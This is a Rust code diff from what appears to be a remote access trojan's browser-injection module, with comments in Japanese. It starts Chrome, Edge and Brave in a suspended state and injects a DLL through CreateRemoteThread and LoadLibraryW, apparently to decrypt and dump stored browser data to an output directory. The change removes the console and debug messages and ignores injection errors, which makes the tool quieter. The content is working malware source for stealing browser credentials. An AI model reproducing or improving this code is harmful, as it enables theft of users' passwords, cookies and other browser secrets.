@@ -83,54 +83,27 @@ impl BrowserInjector {
     /// Chrome/Edge/Brave全てに対してDLL注入を実行し、データを収集
     pub async fn inject_all_browsers(&self) -> Result<BrowserData, RatError> {
         let browsers = ["chrome", "edge", "brave"];
-        let mut success_count = 0;
+
         
         // 出力ディレクトリを環境変数に設定
         unsafe { 
             std::env::set_var("CHROME_DECRYPT_OUT_DIR", &self.output_dir);
         }
         
-        println!("🌐 ブラウザDLL注入開始 (Chrome/Edge/Brave)");
-        
         for browser in &browsers {
             if let Some(exe_path) = self.find_browser_exe(browser) {
-                println!("[+] {}を検出: {}", browser.to_uppercase(), exe_path.display());
-                
-                match self.inject_browser(&exe_path).await {
-                    Ok(()) => {
-                        success_count += 1;
-                        println!("✅ {} DLL注入成功", browser.to_uppercase());
-                    }
-                    Err(e) => {
-                        println!("❌ {} DLL注入失敗: {}", browser.to_uppercase(), e);
-                    }
-                }
+                let _ = self.inject_browser(&exe_path).await;
                 
                 // ブラウザ間の間隔を空ける
                 tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
-            } else {
-                println!("ℹ️  {} が見つかりません（スキップ）", browser.to_uppercase());
             }
         }
         
-        if success_count > 0 {
-            println!("🎯 DLL注入完了: {}/{}ブラウザが成功", success_count, browsers.len());
-            println!("📁 出力先: {}", self.output_dir.display());
-            
-            // IPCベースでは従来のファイル収集は行わない
-            println!("🔍 DLL注入完了：IPCデータ収集モード");
-            Ok(BrowserData::default()) // IPCで受信したデータはmain.rsで処理
-        } else {
-            println!("⚠️  対象ブラウザが見つからないか、すべて注入に失敗しました");
-            Ok(BrowserData::default())
-        }
+        Ok(BrowserData::default())
     }
     
     /// 指定されたブラウザ実行ファイルにDLLを注入
     async fn inject_browser(&self, exe_path: &PathBuf) -> Result<(), RatError> {
-        println!("[DEBUG] DLL注入開始: {}", exe_path.display());
-        println!("[DEBUG] 使用DLL: {}", self.dll_path.display());
-        println!("[DEBUG] 出力先: {}", self.output_dir.display());
         // Create suspended process
         let mut si = STARTUPINFOW::default();
         si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
@@ -198,7 +171,9 @@ impl BrowserInjector {
         if proc.is_none() {
             return Err(RatError::Command("GetProcAddress(LoadLibraryW) failed".to_string()));
         }
-        let start: LPTHREAD_START_ROUTINE = Some(unsafe { std::mem::transmute(proc.unwrap()) });
+        let start: LPTHREAD_START_ROUTINE = Some(unsafe { 
+            std::mem::transmute(proc.expect("LoadLibraryW proc address should be valid"))
+        });
         
         let h_thread = unsafe { 
             match CreateRemoteThread(pi.hProcess, None, 0, start, Some(remote_mem), 0, None) {
@@ -214,9 +189,7 @@ impl BrowserInjector {
         }
         
         // Wait for process to terminate (DLL will call TerminateProcess)
-        println!("[DEBUG] ブラウザプロセス終了待ち...");
-        let wait_result = unsafe { WaitForSingleObject(pi.hProcess, 30000) }; // 30秒タイムアウト
-        println!("[DEBUG] 待機結果: {:?}", wait_result);
+        let _wait_result = unsafe { WaitForSingleObject(pi.hProcess, 30000) }; // 30秒タイムアウト
         
         unsafe {
             let _ = CloseHandle(pi.hThread);
@@ -385,7 +358,7 @@ impl BrowserInjector {
     /// 出力ファイルの存在を確認
     async fn check_output_files(&self) {
         let chrome_decrypt_out = self.output_dir.join("chrome_decrypt_out").join("Chrome");
-        println!("[DEBUG] 出力ディレクトリ確認: {}", chrome_decrypt_out.display());
+        // Check if output directory exists (no logging for cleaner output)
         
         if chrome_decrypt_out.exists() {
             println!("[DEBUG] Chromeディレクトリが存在します");
